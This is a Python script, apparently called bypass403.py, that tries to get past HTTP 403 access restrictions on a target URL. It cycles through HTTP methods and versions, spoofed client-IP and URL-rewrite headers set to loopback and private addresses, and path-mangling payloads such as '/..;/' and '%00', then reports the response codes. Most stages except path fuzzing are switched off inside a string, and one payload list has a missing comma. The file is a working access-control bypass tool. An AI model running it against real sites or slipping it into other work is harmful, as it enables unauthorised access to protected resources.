import requests
import getopt
import sys


from http.client import HTTPConnection
from urllib.parse import urlparse

USER_AGENT = {"User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}


def help():
    print("\t-u URL, --url=URL\tscan url")
    print("\t-p , --path      \tdir or file")
    print("EXAMPLES: ")    
    print("\tbypass403.py -u http://example.com -p test")
    print("\tbypass403.py --url=http://example.com --path=test")

    
def good_code(code, text):
    good = "[+]"
    if code >= 400 and code <= 526:
        good = "[-]"
    return good + text


def version_fuzz(url, path):
    version_payloads = ["HTTP/0.9",
                        "HTTP/1.0",
                        "HTTP/1.1",
                        "HTTP/2"]
    for version in version_payloads:
        HTTPConnection._http_vsn_str = version
        resp = requests.get(f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code,f" {version} [code:{resp.status_code} size:{len(resp.content)}]"))
    HTTPConnection._http_vsn_str = "HTTP/1.1"

        
def methods_fuzz(url, path):
    method_payloads = ["GET",
                       "PUT",                       
                       "POST",
                       "HEAD",                       
                       "COPY",
                       "MOVE",
                       "LOCK",
                       "MKCOL",
                       "PATCH",
                       "TRACE",
                       "UNLOCK",
                       "DELETE",
                       "SEARCH",
                       "OPTIONS",
                       "CONNECT"]
    
    for method in method_payloads:
        resp = requests.request(method, f"{url}/{path}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f" {method} {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))


    
def scheme_fuzz(url, path):
    protocol_payloads = ["X-Forwarded-Protocol",
                         "X-Forwarded-Proto",
                         "X-Url-Scheme",
                         "X-Forwarded-Scheme"]
    
    scheme_payloads = ["http",
                       "https"]
    
    for scheme in scheme_payloads:
        for proto in protocol_payloads:
            resp = requests.get(f"{url}/{path}", headers={proto : scheme, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
            print(good_code(resp.status_code,f" {proto}: {scheme} [code:{resp.status_code} size:{len(resp.content)}]"))


def port_fuzz(url, path):
    ports_payloads = [80, 8080, 8000, 443, 4443]
    for port in ports_payloads:
        resp = requests.get(f"{url}/{path}", headers={"X-Forwarded-Port" : f"{port}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
        print(good_code(resp.status_code,f" X-Forwarded-Port: {port} [code:{resp.status_code} size:{len(resp.content)}]"))

    
def headers_fuzz(url, path):
    headers_payloads = ["Client-IP",
                        "True-Client-IP",
                        "Cluster-Client-IP",
                        "Forwarded-For",
                        "Source-IP",
                        "WL-Proxy-Client-IP",
                        "X-Custom-IP-Authorization",
                        "Host",
                        "X-Forwarded-For",
                        "X-Forwarded",
                        "X-Forwared-Host",
                        "X-Forward-For",
                        "X-Forwarded-By",
                        "X-Forwarded-For-Original",
                        "X-Forwarded-Server",
                        "X-Remote-IP",
                        "X-Remote-Addr",
                        "X-Original-URL",
                        "X-Rewrite-URL",
                        "X-Originating-IP",
                        "X-Original-Host",
                        "X-Original-IP",
                        "X-Original-Remote-Addr",
                        "X-Originally-Forwarded-For",
                        "X-ProxyUser-Ip",
                        "X-Gateway-Host",
                        "X-Host",
                        "X-Ip",
                        "X-Backend-Host",
                        "X-ProxyMesh-IP",
                        "X-Real-IP",
                        "X-True-Client-IP",
                        "X-Wap-Profile"]
    
    values_payloads = ["0",
                       "127.0.0.1",
                       "10.0.0.0",
                       "10.0.0.1",
                       "172.16.0.0",
                       "172.16.0.1",
                       "192.168.1.0",
                       "192.168.1.1",
                       "2130706433",
                       "0x7F000001",
                       "0177.0000.0000.0001",
                       "127.0.0.1:80",
                       "127.0.0.1:8080",
                       "127.0.0.1:8000",
                       "127.0.0.1:4443",
                       "127.0.0.1:443",
                       "localhost",
                       "localhost:80",
                       "localhost:8080",
                       "localhost:8000",                       
                       "localhost:443",
                       "localhost:4443"]

       
    for header in headers_payloads:
        for value in values_payloads:
            resp = requests.get(f"{url}/{path}", headers={header : value, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
            print(good_code(resp.status_code,f" {header}: {value} [code:{resp.status_code} size:{len(resp.content)}]"))
            
    resp = requests.get(f"{url}", headers={"X-Original-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
    print(good_code(resp.status_code,f" X-Original-URL: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))
    
    resp = requests.get(f"{url}", headers={"X-Rewrite-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
    print(good_code(resp.status_code,f" X-Rewrite-URL: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))

    resp = requests.get(f"{url}", headers={"Referer" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=False)
    print(good_code(resp.status_code,f" Referer: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))

            
def paths_fuzz(url, path):
    payloads_list = ["/", "//", "///", "/*", "/.", "/~", "/..", "/;/", "/./", "/.;/", "/..;/", "..;/", ".", "//;//" "#", "?", "??", "???", "~", "*"]
    for payload in payloads_list:
        resp = requests.get(f"{url}{payload}{path}", headers=USER_AGENT, allow_redirects=False)        
        print(good_code(resp.status_code, f"{url}{payload}{path} [code:{resp.status_code} size:{len(resp.content)}]"))

        resp = requests.get(f"{url}{payload}{path.upper()}", headers=USER_AGENT, allow_redirects=False)        
        print(good_code(resp.status_code, f"{url}{payload}{path.upper()} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}{path}.json", headers=USER_AGENT, allow_redirects=False)        
        print(good_code(resp.status_code, f"{url}{payload}{path}.json [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}{path}%20", headers=USER_AGENT, allow_redirects=False)        
        print(good_code(resp.status_code, f"{url}{payload}{path}%20 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}{path}%09", headers=USER_AGENT, allow_redirects=False)        
        print(good_code(resp.status_code, f"{url}{payload}{path}%09 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}{path}%00", headers=USER_AGENT, allow_redirects=False)        
        print(good_code(resp.status_code, f"{url}{payload}{path}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        for payload_two in payloads_list:
            resp = requests.get(f"{url}{payload}{path}{payload_two}", headers=USER_AGENT, allow_redirects=False)        
            print(good_code(resp.status_code, f"{url}{payload}{path}{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))

            resp = requests.get(f"{url}{payload}{path.upper()}{payload_two}", headers=USER_AGENT, allow_redirects=False)        
            print(good_code(resp.status_code, f"{url}{payload}{path.upper()}{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{payload}{path}.json{payload_two}", headers=USER_AGENT, allow_redirects=False)        
            print(good_code(resp.status_code, f"{url}{payload}{path}.json{payload_two} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{payload}{path}{payload_two}%20", headers=USER_AGENT, allow_redirects=False)        
            print(good_code(resp.status_code, f"{url}{payload}{path}{payload_two}%20 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{payload}{path}{payload_two}%09", headers=USER_AGENT, allow_redirects=False)        
            print(good_code(resp.status_code, f"{url}{payload}{path}{payload_two}%09 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{payload}{path}{payload_two}%00", headers=USER_AGENT, allow_redirects=False)        
            print(good_code(resp.status_code, f"{url}{payload}{path}{payload_two}%00 [code:{resp.status_code} size:{len(resp.content)}]"))


def parse_slash(url, path):
    if url[-1] == '/':
        url = url[:-1]
    if path != '/' and path[0] == '/':
        path = path[1:]
    if path != '/' and path[-1] == '/':
        path = path[:-1]
    if path == '/':
        path = ""
    return url, path    

    
def main():       
    url = None
    path = None
    try:
        try:
            opts, args = getopt.getopt(sys.argv[1:], "u:p:r", ["url=", "path="])
            for opt, arg in opts:            
                if opt in ("-u", "--url"):                    
                    url = arg
                elif opt in ("-p", "--path"):                    
                    path = arg
                else:
                    help()
                    sys.exit(0)
        except getopt.GetoptError as err:
            help()
            sys.exit(0)
            
        if url is not None and path is not None:            
            print(f"\nURL: {url}\nPATH: {path}\n")            
            url, path = parse_slash(url, path)
            
            """print("-------------------")
            print("[!] Methods fuzzing")
            print("-------------------\n")
            methods_fuzz(url, path)

            print("\n-------------------")
            print("[!] Scheme fuzzing")
            print("-------------------\n")
            scheme_fuzz(url, path)

            print("\n-------------------")
            print("[!] Port fuzzing")
            print("-------------------\n")
            port_fuzz(url, path)
            
            print("\n-------------------")
            print("[!] Version fuzzing")
            print("-------------------\n")
            version_fuzz(url, path)"""
            
            print("\n-----------------")
            print("[!] Paths fuzzing")
            print("-----------------\n")
            paths_fuzz(url, path)
            
            """print("\n-------------------")
            print("[!] Headers fuzzing")
            print("-------------------\n")
            headers_fuzz(url, path)"""
        else:
            help()
    except KeyboardInterrupt:
        sys.exit(0)
    except requests.ConnectionError as e:
        print(e)
    except requests.Timeout as e:
        print(e)
    except requests.RequestException as e:
        print(e)

if __name__ == "__main__":
    main()
